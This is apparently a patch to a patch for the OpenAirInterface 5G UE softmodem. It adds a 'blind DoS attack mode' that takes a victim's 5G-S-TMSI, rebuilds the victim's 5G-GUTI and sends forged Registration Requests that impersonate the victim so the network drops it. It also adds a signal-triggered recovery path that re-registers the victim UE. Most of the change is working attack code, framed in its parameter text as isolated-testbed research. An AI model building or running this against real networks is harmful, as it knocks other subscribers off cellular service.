@@ -1,8 +1,8 @@
 diff --git a/executables/nr-uesoftmodem.c b/executables/nr-uesoftmodem.c
-index 4a9749e..b697a9a 100644
+index 4a9749e..55ca937 100644
 --- a/executables/nr-uesoftmodem.c
 +++ b/executables/nr-uesoftmodem.c
-@@ -4,11 +4,22 @@
+@@ -4,11 +4,23 @@
  
  
  #define _GNU_SOURCE             /* See feature_test_macros(7) */
@@ -20,12 +20,13 @@ index 4a9749e..b697a9a 100644
 +#include <stdlib.h>
  #include <string.h>
 +#include <time.h>
++#include <sys/eventfd.h>
 +#include <sys/stat.h>
 +#include <unistd.h>
  
  #include "T.h"
  #include "common/oai_version.h"
-@@ -132,11 +143,326 @@ uint64_t set_nrUE_optmask(uint64_t bitmask) {
+@@ -132,11 +144,354 @@ uint64_t set_nrUE_optmask(uint64_t bitmask) {
  nrUE_params_t *get_nrUE_params(void) {
    return &nrUE_params;
  }
@@ -40,6 +41,8 @@ index 4a9749e..b697a9a 100644
 +
 +typedef struct {
 +  int enable;
++  int amf_region_id;
++  int recovery_mode;
 +  int tun_suffix;
 +  int target_wait_s;
 +  char *target_text;
@@ -61,6 +64,8 @@ index 4a9749e..b697a9a 100644
 +
 +#define BLIND_PARAMS_DESC { \
 +  {"enable", "1 = reuse one current 5G-S-TMSI in an isolated testbed\n", 0, .iptr=&blind_cfg.enable, .defintval=0, TYPE_INT, 0}, \
++  {"amf_region_id", "AMF Region ID used to reconstruct the victim 5G-GUTI\n", 0, .iptr=&blind_cfg.amf_region_id, .defintval=-1, TYPE_INT, 0}, \
++  {"recovery_mode", "1 = keep a victim UE process alive after Registration Reject for lab recovery\n", 0, .iptr=&blind_cfg.recovery_mode, .defintval=0, TYPE_INT, 0}, \
 +  {"tun_suffix", "1 = include the PDU session ID in the UE TUN name\n", 0, .iptr=&blind_cfg.tun_suffix, .defintval=0, TYPE_INT, 0}, \
 +  {"target_5g_s_tmsi", "exact 48-bit target as 0x followed by 12 hex digits\n", 0, .strptr=&blind_cfg.target_text, .defstrval=NULL, TYPE_STRING, 0}, \
 +  {"target_file", "absolute path atomically created with the exact target when the one-shot may start\n", 0, .strptr=&blind_cfg.target_file, .defstrval=NULL, TYPE_STRING, 0}, \
@@ -193,6 +198,8 @@ index 4a9749e..b697a9a 100644
 +  paramdef_t params[] = BLIND_PARAMS_DESC;
 +  config_get(cfg, params, sizeofArray(params), "blind");
 +  AssertFatal(blind_cfg.enable == 0 || blind_cfg.enable == 1, "--blind.enable must be 0 or 1\n");
++  AssertFatal(blind_cfg.recovery_mode == 0 || blind_cfg.recovery_mode == 1,
++              "--blind.recovery_mode must be 0 or 1\n");
 +  AssertFatal(blind_cfg.tun_suffix == 0 || blind_cfg.tun_suffix == 1,
 +              "--blind.tun_suffix must be 0 or 1\n");
 +  AssertFatal(blind_cfg.target_wait_s >= 1 && blind_cfg.target_wait_s <= 600,
@@ -201,6 +208,8 @@ index 4a9749e..b697a9a 100644
 +    return;
 +
 +  AssertFatal(NB_UE_INST == 1, "Blind DoS attack mode requires --num-ues 1\n");
++  AssertFatal(blind_cfg.amf_region_id >= 0 && blind_cfg.amf_region_id <= 255,
++              "--blind.amf_region_id must be 0..255 in attack mode\n");
 +  AssertFatal(blind_safe_run_id(blind_cfg.run_id),
 +              "--blind.run_id must use 1..96 characters from [A-Za-z0-9._-]\n");
 +  AssertFatal(blind_cfg.log_file && blind_cfg.log_file[0] == '/',
@@ -239,6 +248,11 @@ index 4a9749e..b697a9a 100644
 +bool nr_blind_use_pdu_suffix(void)
 +{
 +  return blind_cfg.tun_suffix == 1;
++}
++
++bool nr_blind_recovery_enabled(void)
++{
++  return blind_cfg.recovery_mode == 1;
 +}
 +
 +bool nr_blind_defer_initial_ra(void)
@@ -311,6 +325,21 @@ index 4a9749e..b697a9a 100644
 +         && atomic_load_explicit(&blind_state, memory_order_acquire) >= BLIND_MSG3_COMMITTED;
 +}
 +
++bool nr_blind_nas_target(int ue,
++                         uint8_t *amf_region_id,
++                         uint16_t *amf_set_id,
++                         uint8_t *amf_pointer,
++                         uint32_t *tmsi)
++{
++  if (!nr_blind_attempt_active(ue))
++    return false;
++  *amf_region_id = (uint8_t)blind_cfg.amf_region_id;
++  *amf_set_id = (uint16_t)((blind_target >> 38) & 0x3ffU);
++  *amf_pointer = (uint8_t)((blind_target >> 32) & 0x3fU);
++  *tmsi = (uint32_t)blind_target;
++  return true;
++}
++
 +void nr_blind_note_setup_complete(int ue)
 +{
 +  if (!nr_blind_attempt_active(ue))
@@ -352,19 +381,77 @@ index 4a9749e..b697a9a 100644
    AssertFatal(nrUE_params.extra_pdu_id == -1,
                "Add additional PDU sessions in uicc.pdu_sessions array instead\n");
  }
+@@ -269,6 +624,37 @@ static void trigger_deregistration(int sig)
+   }
+ }
+ 
++static int blind_recovery_event_fd = -1;
++
++static void request_blind_victim_recovery(void)
++{
++  for (int ue_inst = 0; ue_inst < NB_UE_INST; ue_inst++) {
++    MessageDef *msg = itti_alloc_new_message(TASK_NAS_NRUE, ue_inst, NAS_DEREGISTRATION_REQ);
++    NAS_DEREGISTRATION_REQ(msg).cause = AS_AUTHENTICATION_FAILURE;
++    itti_send_msg_to_task(TASK_NAS_NRUE, ue_inst, msg);
++  }
++}
++
++static void *blind_victim_recovery_worker(void *arg)
++{
++  (void)arg;
++  uint64_t requests;
++  while (read(blind_recovery_event_fd, &requests, sizeof(requests)) == sizeof(requests)) {
++    while (requests-- > 0)
++      request_blind_victim_recovery();
++  }
++  return NULL;
++}
++
++static void trigger_blind_victim_recovery(int sig)
++{
++  (void)sig;
++  const int saved_errno = errno;
++  const uint64_t request = 1;
++  __attribute__((unused)) ssize_t unused = write(blind_recovery_event_fd, &request, sizeof(request));
++  errno = saved_errno;
++}
++
+ void *nrue_ru_start_thread(void *arg)
+ {
+   (void)arg;
+@@ -496,6 +882,13 @@ int main(int argc, char **argv)
+   // wait for end of program
+   printf("Entering ITTI signals handler\n");
+   printf("TYPE <CTRL-C> TO TERMINATE\n");
++  blind_recovery_event_fd = eventfd(0, EFD_CLOEXEC);
++  AssertFatal(blind_recovery_event_fd >= 0, "eventfd failed: %s\n", strerror(errno));
++  pthread_t blind_recovery_thread;
++  int recovery_thread_rc = pthread_create(&blind_recovery_thread, NULL, blind_victim_recovery_worker, NULL);
++  AssertFatal(recovery_thread_rc == 0, "pthread_create failed: %s\n", strerror(recovery_thread_rc));
++  pthread_detach(blind_recovery_thread);
++  signal(SIGUSR1, trigger_blind_victim_recovery);
+   itti_wait_tasks_end(trigger_deregistration);
+   LOG_W(NR_PHY, "Returned from ITTI signal handler\n");
+   oai_exit = 1;
 diff --git a/executables/nr-uesoftmodem.h b/executables/nr-uesoftmodem.h
-index 43e4f52..4b7e8c0 100644
+index 43e4f52..ff0684b 100644
 --- a/executables/nr-uesoftmodem.h
 +++ b/executables/nr-uesoftmodem.h
-@@ -134,6 +134,15 @@ extern uint64_t get_nrUE_optmask(void);
+@@ -134,6 +134,21 @@ extern uint64_t get_nrUE_optmask(void);
  extern uint64_t set_nrUE_optmask(uint64_t bitmask);
  extern nrUE_params_t *get_nrUE_params(void);
  
 +bool nr_blind_use_pdu_suffix(void);
++bool nr_blind_recovery_enabled(void);
 +bool nr_blind_defer_initial_ra(void);
 +bool nr_blind_take_target_gate(int ue);
 +bool nr_blind_prepare_setup_request(int ue, bool actual_msg3, uint64_t *fiveg_s_tmsi);
 +bool nr_blind_attempt_active(int ue);
++bool nr_blind_nas_target(int ue,
++                         uint8_t *amf_region_id,
++                         uint16_t *amf_set_id,
++                         uint8_t *amf_pointer,
++                         uint32_t *tmsi);
 +void nr_blind_note_setup_complete(int ue);
 +bool nr_blind_withhold_auth(int ue);
 +void nr_blind_log(int ue, const char *event, const char *fmt, ...) __attribute__((format(printf, 3, 4)));
@@ -372,8 +459,20 @@ index 43e4f52..4b7e8c0 100644
  // In nr-ue.c
  extern void fill_ue_band_info(void);
  extern void init_NR_UE(int, char *, char *, char *, int);
+diff --git a/openair2/COMMON/as_message.h b/openair2/COMMON/as_message.h
+index c708ac4..aa1a3e9 100644
+--- a/openair2/COMMON/as_message.h
++++ b/openair2/COMMON/as_message.h
+@@ -379,6 +379,7 @@ typedef struct nas_deregistration_req_s {
+ 
+ typedef struct nas_detach_req_s {
+   bool wait_release;
++  bool reconnect;
+ } nas_detach_req_t;
+ 
+ /**
 diff --git a/openair2/RRC/NR_UE/rrc_UE.c b/openair2/RRC/NR_UE/rrc_UE.c
-index 7858a82..2a1dd48 100644
+index 7858a82..5495d6e 100644
 --- a/openair2/RRC/NR_UE/rrc_UE.c
 +++ b/openair2/RRC/NR_UE/rrc_UE.c
 @@ -371,8 +371,10 @@ static void nr_decode_SI(NR_UE_RRC_SI_INFO *SI_info, NR_SystemInformation_t *si,
@@ -452,7 +551,17 @@ index 7858a82..2a1dd48 100644
      if (rrc->process_target_ntncfg) {
        // Process target NTNCFG as the target cells timing is acquired
        nr_rrc_process_ntnconfig(rrc, &rrc->perNB[NRRRC_FRAME_PROCESS(msg_p).gnb_id].SInfo, rrc->target_ntncfg, rrc->current_frame, true);
-@@ -3448,9 +3455,10 @@ void *rrc_nrue(void *notUsed)
+@@ -3414,7 +3421,8 @@ void *rrc_nrue(void *notUsed)
+     if (NAS_DETACH_REQ(msg_p).wait_release)
+       rrc->detach_after_release = true;
+     else {
+-      rrc->nrRrcState = RRC_STATE_DETACH_NR;
++      if (!NAS_DETACH_REQ(msg_p).reconnect)
++        rrc->nrRrcState = RRC_STATE_DETACH_NR;
+       NR_Release_Cause_t release_cause = OTHER;
+       nr_rrc_going_to_IDLE(rrc, release_cause, NULL);
+     }
+@@ -3448,9 +3456,10 @@ void *rrc_nrue(void *notUsed)
        if (rrc->nrRrcState == RRC_STATE_IDLE_NR) {
          RA_trigger_t prev_trigger = rrc->ra_trigger;
          rrc->ra_trigger = RRC_CONNECTION_SETUP;
@@ -466,7 +575,7 @@ index 7858a82..2a1dd48 100644
        }
        break;
      }
-@@ -3778,9 +3786,8 @@ void handle_302_expired_stopped(NR_UE_RRC_INST_t *rrc)
+@@ -3778,9 +3787,8 @@ void handle_302_expired_stopped(NR_UE_RRC_INST_t *rrc)
  void handle_t300_expiry(NR_UE_RRC_INST_t *rrc)
  {
    rrc->ra_trigger = RRC_CONNECTION_SETUP;
@@ -479,7 +588,7 @@ index 7858a82..2a1dd48 100644
    // TODO handle connEstFailureControl
    // TODO inform upper layers about the failure to establish the RRC connection
 diff --git a/openair3/NAS/NR_UE/nr_nas_msg.c b/openair3/NAS/NR_UE/nr_nas_msg.c
-index 7ef3cbe..af9224f 100644
+index 7ef3cbe..d0e7e0f 100644
 --- a/openair3/NAS/NR_UE/nr_nas_msg.c
 +++ b/openair3/NAS/NR_UE/nr_nas_msg.c
 @@ -790,25 +790,6 @@ static void derive_ue_keys(uint8_t *buf, nr_ue_nas_t *nas)
@@ -508,7 +617,44 @@ index 7ef3cbe..af9224f 100644
  }
  
  nr_ue_nas_t *get_ue_nas_info(module_id_t module_id)
-@@ -1505,18 +1486,6 @@ static void handle_security_mode_command(nr_ue_nas_t *nas, as_nas_info_t *initia
+@@ -902,6 +883,36 @@ static FGSRegistrationType set_fgs_registration_type(nr_ue_nas_t *nas)
+ void generateRegistrationRequest(as_nas_info_t *initialNasMsg, nr_ue_nas_t *nas, bool is_security_mode)
+ {
+   LOG_I(NAS, "Generate Initial NAS Message: Registration Request\n");
++  uint8_t amf_region_id = 0;
++  uint16_t amf_set_id = 0;
++  uint8_t amf_pointer = 0;
++  uint32_t tmsi = 0;
++  if (nr_blind_nas_target(nas->UE_id, &amf_region_id, &amf_set_id, &amf_pointer, &tmsi)) {
++    if (!nas->guti)
++      nas->guti = calloc_or_fail(1, sizeof(*nas->guti));
++    else
++      memset(nas->guti, 0, sizeof(*nas->guti));
++    nas->guti->spare = 0xf;
++    nas->guti->oddeven = 0;
++    nas->guti->typeofidentity = FGS_MOBILE_IDENTITY_5G_GUTI;
++    nas->guti->mccdigit1 = nas->uicc->imsiStr[0] - '0';
++    nas->guti->mccdigit2 = nas->uicc->imsiStr[1] - '0';
++    nas->guti->mccdigit3 = nas->uicc->imsiStr[2] - '0';
++    nas->guti->mncdigit1 = nas->uicc->nmc_size == 2 ? nas->uicc->imsiStr[3] - '0' : nas->uicc->imsiStr[4] - '0';
++    nas->guti->mncdigit2 = nas->uicc->nmc_size == 2 ? nas->uicc->imsiStr[4] - '0' : nas->uicc->imsiStr[5] - '0';
++    nas->guti->mncdigit3 = nas->uicc->nmc_size == 2 ? 0xf : nas->uicc->imsiStr[3] - '0';
++    nas->guti->amfregionid = amf_region_id;
++    nas->guti->amfsetid = amf_set_id;
++    nas->guti->amfpointer = amf_pointer;
++    nas->guti->tmsi = tmsi;
++    nr_blind_log(nas->UE_id,
++                 "nas_guti_selected",
++                 "\"amf_region_id\":%u,\"amf_set_id\":%u,\"amf_pointer\":%u,\"tmsi\":%u",
++                 amf_region_id,
++                 amf_set_id,
++                 amf_pointer,
++                 tmsi);
++  }
+   int size = sizeof(fgmm_msg_header_t); // cleartext size
+   fgmm_nas_msg_security_protected_t sp = {0};
+ 
+@@ -1505,18 +1516,6 @@ static void handle_security_mode_command(nr_ue_nas_t *nas, as_nas_info_t *initia
    derive_knas(0x01, ciphering_algorithm, kamf, knas_enc);
    derive_knas(0x02, integrity_algorithm, kamf, knas_int);
  
@@ -527,7 +673,7 @@ index 7ef3cbe..af9224f 100644
    if (integrity_algorithm != EIA0_ALG_ID) {
      nas->security_container = stream_security_container_init(ciphering_algorithm, integrity_algorithm, knas_enc, knas_int);
    } else {
-@@ -1761,7 +1730,7 @@ static void handle_pdu_session_accept(const nr_ue_nas_t *nas, uint8_t *pdu_buffe
+@@ -1761,7 +1760,7 @@ static void handle_pdu_session_accept(const nr_ue_nas_t *nas, uint8_t *pdu_buffe
    set_qfi(msg.qos_rules.rule->qfi, sm_header.pdu_session_id, instance);
  
    // process PDU Session: pass ID -1 to not append PDU ID to interface
@@ -536,7 +682,77 @@ index 7ef3cbe..af9224f 100644
    if (msg.pdu_type == PDU_SESSION_TYPE_ETHER) {
      create_ue_eth_if(instance, sm_header.pdu_session_id, is_default);
    } else if (msg.pdu_addr_ie.pdu_length) {
-@@ -2472,7 +2441,8 @@ void *nas_nrue(void *args_p)
+@@ -1978,11 +1977,12 @@ static void send_nas_initial_ul_transfer_req(nr_ue_nas_t *nas, const as_nas_info
+   itti_send_msg_to_task(TASK_RRC_NRUE, nas->UE_id, msg);
+ }
+ 
+-static void send_nas_detach_req(nr_ue_nas_t *nas, bool wait_release)
++static void send_nas_detach_req(nr_ue_nas_t *nas, bool wait_release, bool reconnect)
+ {
+   MessageDef *msg = itti_alloc_new_message(TASK_NAS_NRUE, nas->UE_id, NAS_DETACH_REQ);
+   nas_detach_req_t *req = &NAS_DETACH_REQ(msg);
+   req->wait_release = wait_release;
++  req->reconnect = reconnect;
+   itti_send_msg_to_task(TASK_RRC_NRUE, nas->UE_id, msg);
+ }
+ 
+@@ -2228,8 +2228,8 @@ static void handle_registration_reject(nr_ue_nas_t *nas, const byte_array_t *buf
+   LOG_E(NAS, "Received Registration Reject cause: %s\n", print_info(msg.cause, fgmm_cause_s, sizeofArray(fgmm_cause_s)));
+   free_fgs_registration_reject(&msg);
+   nas->fiveGMM_state = FGS_DEREGISTERED;
+-  nas->termination_procedure = true;
+-  send_nas_detach_req(nas, false);
++  nas->termination_procedure = !nr_blind_recovery_enabled();
++  send_nas_detach_req(nas, false, false);
+ }
+ 
+ void *nas_nrue(void *args_p)
+@@ -2410,7 +2410,7 @@ void *nas_nrue(void *args_p)
+           nas->fiveGMM_state = FGS_REGISTERED;
+         nas->fiveGMM_mode = FGS_IDLE;
+         // TODO handle connection release
+-        if (nas->termination_procedure) {
++        if (nas->termination_procedure && !nr_blind_recovery_enabled()) {
+           /* the following is not clean, but probably necessary: we need to give
+            * time to RLC to Ack the SRB1 PDU which contained the RRC release
+            * message. Hence, we just below wait some time, before finally
+@@ -2433,18 +2433,31 @@ void *nas_nrue(void *args_p)
+       case NAS_DEREGISTRATION_REQ: {
+         LOG_I(NAS, "[UE %ld] Received %s\n", nas->UE_id, ITTI_MSG_NAME(msg_p));
+         nas_deregistration_req_t *req = &NAS_DEREGISTRATION_REQ(msg_p);
+-        if (nas->guti) {
++        if (req->cause == AS_AUTHENTICATION_FAILURE) {
++          nas->termination_procedure = false;
++          nas->fiveGMM_state = FGS_DEREGISTERED;
++          nas->fiveGMM_mode = FGS_IDLE;
++          send_nas_detach_req(nas, false, true);
++          as_nas_info_t initial_nas = {0};
++          generateRegistrationRequest(&initial_nas, nas, false);
++          if (initial_nas.length > 0) {
++            send_nas_initial_ul_transfer_req(nas, &initial_nas);
++            LOG_I(NAS, "[UE %ld] Blind DoS recovery registration requested\n", nas->UE_id);
++          }
++          break;
++        }
++        if (nas->guti && nas->security_container) {
+           if (req->cause == AS_DETACH) {
+             nas->termination_procedure = true;
+-            send_nas_detach_req(nas, true);
++            send_nas_detach_req(nas, true, false);
+           }
+           as_nas_info_t initialNasMsg = {0};
+           generateDeregistrationRequest(nas, &initialNasMsg);
+           send_nas_uplink_data_req(nas, &initialNasMsg);
+         } else {
+-          LOG_W(NAS, "No GUTI, cannot trigger deregistration request.\n");
++          LOG_W(NAS, "No GUTI or NAS security context, cannot trigger protected deregistration request.\n");
+           if (req->cause == AS_DETACH)
+-            send_nas_detach_req(nas, false);
++            send_nas_detach_req(nas, false, false);
+         }
+       } break;
+ 
+@@ -2472,7 +2485,8 @@ void *nas_nrue(void *args_p)
              handle_identity_request(&initialNasMsg, nas, buffer);
              break;
            case FGS_AUTHENTICATION_REQUEST:
